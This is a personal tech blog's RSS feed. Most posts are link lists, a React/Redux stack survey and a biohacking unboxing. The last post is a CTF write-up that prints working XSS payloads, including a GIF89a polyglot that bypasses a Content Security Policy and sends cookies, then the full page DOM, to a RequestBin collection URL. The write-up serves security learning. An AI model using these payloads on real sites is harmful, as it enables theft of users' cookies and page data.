<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
      <title>devalias.net</title>
   
   <link>http://devalias.net</link>
   <description>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.
</description>
   <language>en-uk</language>
   <managingEditor> devalias</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
	  <title>TODO: Tech Companies Open Source</title>
	  <link>/devalias/2016/10/13/todo-tech-companies-open-source/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/todo-tech-companies-open-source/</guid>
	  <description><![CDATA[
	     <ul>
<li>TODO: Main page and github for various tech companies</li>
<li>Facebook

<ul>
<li><a href="https://code.facebook.com/posts/">https://code.facebook.com/posts/</a></li>
<li><a href="https://code.facebook.com/projects/">https://code.facebook.com/projects/</a></li>
</ul></li>
<li>Netflix

<ul>
<li><a href="http://techblog.netflix.com/">http://techblog.netflix.com/</a></li>
<li><a href="http://netflix.github.io/falcor/">http://netflix.github.io/falcor/</a></li>
</ul></li>
<li>Twitter

<ul>
<li><a href="https://engineering.twitter.com/">https://engineering.twitter.com/</a></li>
<li><a href="https://engineering.twitter.com/opensource">https://engineering.twitter.com/opensource</a></li>
</ul></li>
<li>AirBnB

<ul>
<li><a href="http://airbnb.io/">http://airbnb.io/</a></li>
<li><a href="http://airbnb.io/projects/">http://airbnb.io/projects/</a></li>
<li><a href="http://nerds.airbnb.com/">http://nerds.airbnb.com/</a></li>
</ul></li>
<li>GitHub

<ul>
<li><a href="http://githubengineering.com/">http://githubengineering.com/</a></li>
<li><a href="https://github.com/blog/category/engineering">https://github.com/blog/category/engineering</a></li>
</ul></li>
<li>Etsy

<ul>
<li><a href="https://codeascraft.com/">https://codeascraft.com/</a></li>
<li><a href="https://etsy.github.io/">https://etsy.github.io/</a></li>
</ul></li>
<li>etc</li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>TODO: Microservices and Orchestration</title>
	  <link>/devalias/2016/10/13/todo-microservices-and-orchestration/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/todo-microservices-and-orchestration/</guid>
	  <description><![CDATA[
	     <ul>
<li><p>TODO: docker, swarm, kubernetes, lagom, akka, etc</p></li>
<li><p><a href="https://opensource.com/resources/what-are-microservices">https://opensource.com/resources/what-are-microservices</a></p></li>
<li><p><a href="https://www.nginx.com/blog/introduction-to-microservices/">https://www.nginx.com/blog/introduction-to-microservices/</a></p></li>
<li><p><a href="http://microservices.io/">http://microservices.io/</a></p>

<ul>
<li><a href="http://microservices.io/patterns/microservices.html">http://microservices.io/patterns/microservices.html</a></li>
</ul></li>
<li><p><a href="http://martinfowler.com/microservices/">http://martinfowler.com/microservices/</a></p></li>
<li><p><a href="https://auth0.com/blog/an-introduction-to-microservices-part-1/">https://auth0.com/blog/an-introduction-to-microservices-part-1/</a></p></li>
<li><p><a href="https://www.lightbend.com/blog/a-new-trilogy-the-enterprise-architects-intro-to-microservices">https://www.lightbend.com/blog/a-new-trilogy-the-enterprise-architects-intro-to-microservices</a></p></li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>TODO: Feature Flags, Etc</title>
	  <link>/devalias/2016/10/13/todo-feature-flags-etc/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/todo-feature-flags-etc/</guid>
	  <description><![CDATA[
	     <ul>
<li>TODO: Feature flags, how does that work with microservices, tying in with continuous deploymnet, etc</li>
<li><a href="http://blog.launchdarkly.com/">http://blog.launchdarkly.com/</a></li>
<li><a href="http://blog.launchdarkly.com/feature-flag-driven-development/">http://blog.launchdarkly.com/feature-flag-driven-development/</a></li>
<li><a href="http://blog.launchdarkly.com/feature-flag-driven-releases/">http://blog.launchdarkly.com/feature-flag-driven-releases/</a></li>
<li><p><a href="http://featureflags.io/resources/">http://featureflags.io/resources/</a></p>

<ul>
<li><a href="http://martinfowler.com/bliki/FeatureToggle.html">http://martinfowler.com/bliki/FeatureToggle.html</a></li>
</ul></li>
<li><p><a href="http://featureflags.io/">http://featureflags.io/</a></p></li>
<li><p>Java</p>

<ul>
<li><a href="http://www.togglz.org/">http://www.togglz.org/</a></li>
<li><a href="http://www.ff4j.org/">http://www.ff4j.org/</a></li>
<li><a href="https://github.com/tacitknowledge/flip">https://github.com/tacitknowledge/flip</a></li>
</ul></li>
<li><p><a href="https://github.com/wix/petri">https://github.com/wix/petri</a></p></li>
<li><p><a href="https://github.com/adobe-platform/feature-flipper">https://github.com/adobe-platform/feature-flipper</a></p></li>
<li><p><a href="https://github.com/fetlife/rollout">https://github.com/fetlife/rollout</a></p></li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>Starting a New Web Application (Part 2): A Time to React</title>
	  <link>/devalias/2016/10/13/starting-a-new-web-application-2-a-time-to-react/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/starting-a-new-web-application-2-a-time-to-react/</guid>
	  <description><![CDATA[
	     <p>In <a href="TODO">part 1</a> we started looking into the current web application landscape, and what technologies are out there. From what I learned through my research there, I have decided to delve further into <a href="https://facebook.github.io/react/">React</a>; partly because it&#39;s one of the current hot topics and seems really interesting, partly because I think Facebook are pretty cool and make some awesome things, and partly because it&#39;ll be a good skill to flesh out for my resume/future endeavours.</p>

<h2>ToC</h2>

<ul>
<li><a href="#introductory-reading">Introductory Reading</a></li>
<li><a href="#desired-features">Desired Features</a></li>
<li><a href="#react">React</a></li>
<li><a href="#flux">Flux</a></li>
<li><a href="#libraries-features">Libraries and Features</a>

<ul>
<li>Routing</li>
<li>API&#39;s (REST, etc)</li>
<li>Authentication</li>
<li>Isomorphic</li>
<li>DevTools</li>
</ul></li>
<li><a href="#boilerplate-starters-examples">Boilerplate, Starter Kits and Examples</a></li>
<li><a href="#stack-tools">Choosing my Stack and Tools</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2><a name="introductory-reading"></a>Introductory Reading</h2>

<p>To save myself rewriting what&#39;s already been explained, here are some quick intro articles on React, Flux and JSX that helped my to understand it all a bit better. If you need a quick refresher, I&#39;ll see you in a minute:</p>

<ul>
<li><a href="http://blog.andrewray.me/reactjs-for-stupid-people/">&quot;ReactJS For Stupid People&quot; by Andrew Ray</a></li>
<li><a href="http://blog.andrewray.me/flux-for-stupid-people/">&quot;Flux For Stupid People&quot; by Andrew Ray</a></li>
<li><a href="http://blog.andrewray.me/youre-missing-the-point-of-jsx/">&quot;You&#39;re Missing The Point Of JSX&quot; by Andrew Ray</a></li>
<li><a href="https://facebook.github.io/react/docs/getting-started.html">React: Getting Started</a></li>
<li><a href="https://facebook.github.io/react/docs/tutorial.html">React: Tutorial</a></li>
<li><a href="https://www.toptal.com/react/navigating-the-react-ecosystem">&quot;Navigating the React Ecosystem&quot; by Tomas Holas</a></li>
</ul>

<h2><a name="desired-features"></a>Desired Features</h2>

<p>To help narrow down which libraries/solutions I might go with, it helped to have a bit of an idea of what sort of features/ideas I wanted to incorporate into my stack. In no particular order:</p>

<ul>
<li>Single page application</li>
<li>Driven by a first-class API</li>
<li>Microservices</li>
<li>Token-based Authentication</li>
<li><a href="https://medium.com/front-end-hacking/the-secret-to-organization-in-functional-programming-913484e85fc9">&#39;Feature First&#39; Organization</a></li>
<li><a href="http://www.reactivemanifesto.org/">Reactive</a></li>
<li><a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">&#39;DRY&#39;</a></li>
<li><a href="http://nerds.airbnb.com/isomorphic-javascript-future-web-apps/">Isomorphic</a>?</li>
</ul>

<h2><a name="react"></a>React</h2>

<p>This one is nice and simple. <a href="https://facebook.github.io/react/">React</a> is React. We don&#39;t have a crazy environment of different options, flavours and alternatives we need to weigh up and choose between here.</p>

<blockquote>
<p>React is a JavaScript library for creating user interfaces by Facebook and Instagram. Many people choose to think of React as the V in MVC. - <a href="https://facebook.github.io/react/docs/why-react.html">Why React?</a></p>
</blockquote>

<p>If you need to know more about it, make sure to go back and brush up on the <a href="#introductory-reading">introductory reading</a>.</p>

<h2><a name="flux"></a>Flux</h2>

<p><a href="https://facebook.github.io/flux/">Flux</a> (<a href="https://github.com/facebook/flux">GitHub</a>) is a concept <a href="https://facebook.github.io/react/blog/2014/05/06/flux.html">announced back in 2014</a> by Facebook. Since it isn&#39;t a library like React, there are SO many flavours, choices and differing implementations. You could be stuck here in analysis paralysis forever.</p>

<blockquote>
<p>Flux is the application architecture that Facebook uses for building client-side web applications. It complements React&#39;s composable view components by utilizing a unidirectional data flow. It&#39;s more of a pattern rather than a formal framework, and you can start using Flux immediately without a lot of new code. - <a href="https://facebook.github.io/flux/docs/overview.html">Flux Overview</a></p>
</blockquote>

<p>Thankfully a whole pile of different people have already put together some comparisons of different implementations, and why you might want to pick one over another:</p>

<ul>
<li><a href="https://github.com/kriasoft/react-starter-kit/issues/22">&quot;Which Flux implementation should I use?&quot; on react-starter-kit</a></li>
<li><a href="http://pixelhunter.me/post/110248593059/flux-solutions-compared-by-example">&quot;Flux solutions compared by example&quot; by pixelhunter</a> (<a href="https://github.com/voronianski/flux-comparison">GitHub</a>)</li>
</ul>

<p>There are <a href="https://github.com/justinwoo/react-rxjs-flow">even</a> <a href="http://qiita.com/kimagure/items/22cf4bb2a967fcba376e">some</a> <a href="https://github.com/AlexMost/RxReact">people</a> playing with the idea of skipping Flux entirely and using <a href="https://github.com/Reactive-Extensions/RxJS">RxJS</a>.</p>

<p>Reading through the various options out there, I pretty much came to the conclusion that I probably want to be looking at <a href="https://facebook.github.io/relay/">Relay</a> by Facebook (<a href="https://github.com/facebook/relay">GitHub</a>, <a href="https://github.com/relayjs/relay-starter-kit">Starter Kit</a>) and <a href="http://redux.js.org/">Redux</a> (<a href="https://github.com/reactjs/redux">GitHub</a>). I&#39;ve briefly spoken about these two before in <a href="/devalias/2016/09/07/graphql-why-you-should-care/#graphql-relay-redux">&quot;GraphQL: Why You Should Care&quot;</a>. But for the sake of completeness, here are the relevant articles again:
* <a href="https://www.reindex.io/blog/redux-and-relay/">&quot;Comparing Redux and Relay&quot; by Mikhail Novikov</a>
* <a href="https://medium.com/@matt.krick/replacing-relay-with-redux-2990c81aa807">&quot;Replacing Relay with Redux&quot; by Matt Krick</a>
* <a href="https://medium.com/@thisbejim/getting-started-with-redux-and-graphql-8384b3b25c56">&quot;Getting started with Redux and GraphQL&quot; by James Childs-Maidment</a></p>

<p>While I think Relay is pretty cool, and seems like it will <a href="https://facebook.github.io/react/blog/2016/08/05/relay-state-of-the-state.html">only keep getting better</a>, I think sticking to a Redux based stack for the time being will suit my needs better. Though don&#39;t think that leaves you missing out. There are a number of projects that combine the best aspects of both worlds:</p>

<ul>
<li><a href="http://www.apollostack.com/">Apollo Stack</a></li>
<li><a href="https://github.com/mattkrick/cashay">Cashay</a>: &quot;Relay for the rest of us&quot;</li>
<li><a href="https://github.com/gyzerok/adrenaline">Adrenaline</a>: &quot;Simple Relay alternative&quot;</li>
<li><a href="https://github.com/kennetpostigo/react-reach">React-Reach</a>: &quot;A small library for React to communicate with GraphQL&quot;</li>
</ul>

<p>There also seems to be some pretty lively discussions worth watching as well:</p>

<ul>
<li><a href="https://github.com/reactjs/redux/issues/464">Redux #464: &quot;Relay and Redux&quot;</a></li>
<li><a href="https://github.com/reactjs/redux/issues/775">Redux #775: &quot;Has Redux&#39;s Time Come and Gone&quot; </a></li>
</ul>

<p>A nice feature of Redux is that it <a href="http://redux.js.org/docs/basics/UsageWithReact.html">isn&#39;t just tied to React</a>; so you can write Redux apps with <a href="https://github.com/reactjs/react-redux">React</a>, <a href="https://github.com/angular-redux">Angular</a>, <a href="http://www.ember-redux.com/">Ember</a>, jQuery, or even vanilla JavaScript.</p>

<p>The best way to learn about Redux, how it works, and why you should care, is through the official (free) course: <a href="https://egghead.io/courses/getting-started-with-redux">&quot;Getting Started with Redux&quot;</a> (<a href="https://github.com/tayiorbeii/egghead.io_redux_course_notes">Notes</a>)</p>

<p>Finally, while it might be a little early to throw this into the mix, for the sake of completeness in &#39;interesting things I read on this topic&#39;:</p>

<ul>
<li><a href="http://jamesknelson.com/join-the-dark-side-of-the-flux-responding-to-actions-with-actors/">&quot;Join The Dark Side Of The Flux: Responding to Actions with Actors&quot; by James K Nelson</a></li>
</ul>

<h2><a name="libraries-features"></a>Libraries and Features</h2>

<p>Following the DRY principles, there are bound to be tons of pre-existing libraries to help implement all sorts of features you may want/need. While it&#39;s always hard to truly know what you want till you get started, you could start by looking through some <a href="https://github.com/enaqx/awesome-react">awesome react</a>/<a href="https://github.com/jondot/awesome-react-native">react native</a> lists; or read on below.</p>

<p><strong>Routing</strong></p>

<ul>
<li><a href="https://github.com/reactjs/react-router">React-Router</a>: This seems to be the de-facto standard.

<ul>
<li><a href="https://github.com/react-bootstrap/react-router-bootstrap">React-Router-Bootstrap</a></li>
</ul></li>
<li><a href="https://github.com/kriasoft/universal-router">Universal Router</a>: &quot;A simple middleware-style router for isomorphic JavaScript web apps&quot;</li>
</ul>

<p><strong>API&#39;s (REST, etc)</strong></p>

<ul>
<li><p><a href="https://stackoverflow.com/questions/33821053/is-there-any-good-http-library-for-react-flux-architecture">&quot;Is there any good Http library for React flux architecture&quot; on StackOverflow</a></p>

<ul>
<li><a href="https://github.github.io/fetch/">Fetch</a> (<a href="https://github.com/github/fetch">GitHub</a>): &quot;A window.fetch JavaScript polyfill&quot;</li>
<li><a href="https://github.com/matthew-andrews/isomorphic-fetch">Isomorphic-Fetch</a>: &quot;Isomorphic WHATWG Fetch API, for Node &amp; Browserify&quot;</li>
<li><a href="https://github.com/visionmedia/superagent">Superagent</a>: &quot;Ajax with less suck&quot;</li>
<li><a href="https://github.com/mbasso/react-http-request">React-Http-Request</a>: Uses superagent</li>
<li><a href="https://github.com/mzabriskie/axios">Axios</a>: &quot;Promise based HTTP client for the browser and node.js&quot;</li>
</ul></li>
<li><p><a href="https://github.com/marmelab/restful.js">Restful.js</a>: &quot;A pure JS client for interacting with server-side RESTful resources. Think Restangular without Angular.&quot;</p></li>
</ul>

<p><strong>Authentication</strong></p>

<ul>
<li><a href="https://github.com/lynndylanhurley/redux-auth">Redux-Auth</a>: &quot;Complete token authentication system for react + redux&quot;</li>
<li><a href="https://github.com/mjrussell/redux-auth-wrapper">Redux-Auth-Wrapper</a>: &quot;A React Higher Order Component (HOC) for handling Authentication and Authorization with Redux and React-Router&quot;</li>
<li><a href="https://github.com/joshgeller/react-redux-jwt-auth-example">React-Redux-JWT-Auth-Example</a>: &quot;Sample project showing possible authentication flow using React, Redux, React-Router, and JWT&quot;</li>
</ul>

<p>For some further reading on this topic:
* <a href="https://scotch.io/tutorials/build-a-react-flux-app-with-user-authentication">&quot;Build a React + Flux App with User Authentication&quot; by Ryan Chenkie</a>
* <a href="https://auth0.com/blog/adding-authentication-to-your-react-flux-app/">&quot;Adding authentication to your React Flux app&quot; by Martin Gontovnikas</a> (<a href="https://github.com/auth0-blog/react-flux-jwt-authentication-sample">GitHub</a>)
* <a href="https://medium.com/@rajaraodv/securing-react-redux-apps-with-jwt-tokens-fcfe81356ea0">&quot;Securing React Redux Apps With JWT Tokens&quot; by rajaraodv</a></p>

<p><strong>Isomorphic</strong></p>

<ul>
<li><a href="http://airbnb.io/projects/hypernova/">Hypernova</a> (<a href="https://github.com/airbnb/hypernova">GitHub</a>): &quot;A service for server-side rendering your JavaScript views&quot;</li>
</ul>

<p><strong>DevTools</strong></p>

<ul>
<li><a href="https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi">React Developer Tools</a></li>
<li><a href="https://chrome.google.com/webstore/detail/redux-devtools/lmhkpmbekcpmknklioeibfkpmmfibljd">Redux DevTools</a></li>
</ul>

<h2><a name="boilerplate-starters-examples"></a>Boilerplate, Starter Kits and Examples</h2>

<p>You might be noticing a bit of a trend: each step you take forward, there seem to be a million different options and considerations to make; and this is no different.</p>

<p>To try and avoid this decision fatigue and help new dev&#39;s dive head first into the React world, Facebook has released their very own starter tool: <a href="https://github.com/facebookincubator/create-react-app">Create-React-App</a>. It&#39;s early days still, but this is definitely something to keep an eye on going forward.</p>

<p>Looking through <a href="http://habd.as/awesome-react-boilerplates/">&quot;Awesome React Boilerplates&quot;</a> and some of the other starter kit/generators out there, we have a lot to pick from. With so many options, a <a href="http://andrewhfarmer.com/starter-project/">tool to help narrow it down</a> is pretty useful, but here are some others just in case:</p>

<ul>
<li><a href="https://github.com/kriasoft/react-starter-kit">React-Starter-Kit | Kriasoft</a> (10403): React, modular Flux (with Redux feature), Universal-Router, Babel, Webpack, GraphQL,</li>
<li><a href="https://github.com/mxstbr/react-boilerplate">React-Boilerplate | mxstbr</a> (9052): React, Redux, React-Router, Babel, Webpack, CSS Modules</li>
<li><a href="https://github.com/coryhouse/react-slingshot">React-Slingshot | Cory House</a> (4445): React, Redux, React-Router, Babel, Webpack, etc</li>
<li><a href="https://github.com/jaredpalmer/react-production-starter">React-Production-Starter | Jarad Palmer</a> (834): React, Redux, React-Router, Immutable, Babel, Webpack, etc</li>
<li><a href="http://unicornstandard.com/packages/boilerplate.html">Unicorn-Standard Starter-Kit</a> (403)</li>
</ul>

<p>Or take a look at some examples:</p>

<ul>
<li><a href="https://github.com/arturopala/traffic-lights-control">Example: Traffic-Lights-Control</a>
React, Redux, Akka, Akka-HTTP, WebSockets</li>
<li><a href="https://github.com/tomaash/react-example-filmdb">React-Example-FilmDB</a>: &quot;Isomorphic React + Flux film database example&quot;</li>
</ul>

<h2><a name="stack-tools"></a>Choosing my Stack and Tools</h2>

<ul>
<li>TODO: Should this be in a new post?</li>
</ul>

<p>SASS</p>

<p>Foundation or Bootstrap or Material?</p>

<p><a href="https://nuclide.io/">https://nuclide.io/</a> (IDE)
  <a href="https://github.com/facebook/nuclide">https://github.com/facebook/nuclide</a></p>

<p><a href="https://flowtype.org/">https://flowtype.org/</a> (Typed JS)
  <a href="https://github.com/facebook/flow">https://github.com/facebook/flow</a></p>

<p>With babel?</p>

<p><a href="https://facebook.github.io/immutable-js/">https://facebook.github.io/immutable-js/</a>
  <a href="https://github.com/facebook/immutable-js/">https://github.com/facebook/immutable-js/</a></p>

<p>Markdown
  <a href="https://github.com/jonschlinkert/remarkable">https://github.com/jonschlinkert/remarkable</a></p>

<h2><a name="conclusion"></a>Conclusion</h2>

	  ]]></description>
	</item>

	<item>
	  <title>Creating Chrome Extensions</title>
	  <link>/devalias/2016/10/13/creating-chrome-extensions/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/creating-chrome-extensions/</guid>
	  <description><![CDATA[
	     <ul>
<li><p><a href="http://yeoman.io/">http://yeoman.io/</a></p>

<ul>
<li><a href="https://github.com/yeoman/generator-chrome-extension">https://github.com/yeoman/generator-chrome-extension</a></li>
<li><a href="https://github.com/ironSource/node-generator-chrome-ninja">https://github.com/ironSource/node-generator-chrome-ninja</a></li>
<li><a href="https://github.com/handtrix/generator-chrome-extension-kickstart">https://github.com/handtrix/generator-chrome-extension-kickstart</a></li>
<li><a href="https://github.com/nibblesnbits/generator-chrome-extension-simple">https://github.com/nibblesnbits/generator-chrome-extension-simple</a></li>
</ul></li>
<li><p><a href="http://extensionizr.com/">http://extensionizr.com/</a></p>

<ul>
<li><a href="https://github.com/altryne/extensionizr">https://github.com/altryne/extensionizr</a></li>
</ul></li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>Bulletproof Biohacking Box #8</title>
	  <link>/devalias/2016/10/13/bulletproof-biohacking-box-8/</link>
	  <author>devalias</author>
	  <pubDate>2016-10-13T10:39:15+11:00</pubDate>
	  <guid>/devalias/2016/10/13/bulletproof-biohacking-box-8/</guid>
	  <description><![CDATA[
	     <p>So it&#39;s that time again where biohacking christmas comes early (4 times a year!) Before I get into the content from this box, it seems Dave and the team have decided to move on from <a href="https://quarterly.co/">Quarterly</a> and give the biohacking box a new home on <a href="http://biohacked.com/">biohacked.com</a>. So if you want to find it, make sure you head over there and sign up!</p>

<p>Without further ado, the contents!</p>

<h2>BIO08</h2>

<ul>
<li><a href="https://quarterly.co/BIO08">BIO08 Unboxing Video</a>

<ul>
<li>0:45 Total box value: ~US$287</li>
<li>1:04 <a href="https://alituranaturals.com/product/alitura-night-cream/">Alitura Night Cream</a> (US$79)

<ul>
<li>20% discount code: BP20</li>
<li>Jar should last about a month.</li>
</ul></li>
<li>5:01 <a href="http://www.swanwicksleep.com/products/swannies-blue-light-blocking-glasses">Swannies Blue Blocking Glasses</a> (~US$89-134)

<ul>
<li>40% discount code: BULLETPROOF</li>
</ul></li>
<li>8:52 <a href="http://bedtimebliss.org/products/btbt">Bedtime Bliss Organic Bamboo Sleep Mask</a> ($US17.50)

<ul>
<li>Contoured so it doesn&#39;t press on your eyes/eyelashes during REM sleep.</li>
<li>Been using this for the past few nights and it&#39;s been awesome! I haven&#39;t managed to black out my room yet since moving recently. Using this has shown a dramatic increase in deeper sleep on my sleep tracking, and generally just feeling more rested with it.</li>
</ul></li>
<li>10:38 <a href="http://www.bluestarcoloring.com/our-books/">Blue Star &#39;Form&#39; Coloring Book</a> ($US18)

<ul>
<li>Increases HRV, drops you into a calmer alpha state.</li>
<li>30% discount on their <a href="http://bluestarinspire.com/bulletproof">digital subscription service: Inspire</a></li>
</ul></li>
<li>14:15 Colored Pencils

<ul>
<li>With Bulletproof logo! :p</li>
</ul></li>
<li>15:06 <a href="https://fatwater.com/home">FATwater - a whole case</a></li>
<li>16:57 Golden Ticket: <a href="http://www.thync.com/">Thync</a> (US$199)

<ul>
<li>Form of tDCS for energy/calm</li>
<li>$20 off: SHFVIBE (till 24/11/16)</li>
</ul></li>
<li>21:00 Golden Ticket: <a href="http://bulletproofconference.com">2016 Bulletproof Conference Pass +1</a> (US$1500)</li>
</ul></li>
</ul>

	  ]]></description>
	</item>

	<item>
	  <title>CTF Snippets: XSS.gif</title>
	  <link>/devalias/2016/09/16/ctf-snippets-xss-gif/</link>
	  <author>devalias</author>
	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
	  <guid>/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
	  <description><![CDATA[
	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I&#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>

<h2>Hack the gibso.. Website</h2>

<p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>

<p>Poking around at things, I discovered that the messaging system didn&#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div>
<p>I checked the message.. but for some reason it didn&#39;t pop, even though my payload seemed fine in the source. :(</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div>
<p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>

<blockquote>
<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.</p>
</blockquote>

<p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
<div class="highlight"><pre><code class="language-" data-lang="">Content-Security-Policy:
  default-src 'none';
  img-src 'self' placehold.it *.imgix.net;
  script-src 'self';
  connect-src 'self';
  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
</code></pre></div>
<p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>

<p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>

<p>Using the <code>GIF89a</code> format (which conveniently starts with it&#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &#39;avatar&#39; <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">'http://requestb.in/secretcode?c='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</code></pre></div>
<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &#39;avatar&#39; by sending myself a test message:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://example.com/uploads/filenamehash.gif"</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div>
<p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>

<blockquote>
<p>Refused to execute script from &#39;<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>&#39; because its MIME type (&#39;image/gif&#39;) is not executable.</p>
</blockquote>

<p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>

<p>Ok.. so we couldn&#39;t steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn&#39;t seem to get validated. That&#39;s good.. but what should we target?</p>

<p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="cm">/* Wait for the page to fully load */</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="cm">/* Create a form to send to RequestBin */</span>
  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>

  <span class="cm">/* Create a textarea to store our data */</span>
  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>

  <span class="cm">/* Capture the entire DOM and Base64 encode it */</span>
  <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">)</span>

  <span class="cm">/* Inject the form and send it */</span>
  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
<span class="p">};</span>
</code></pre></div>
<p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>

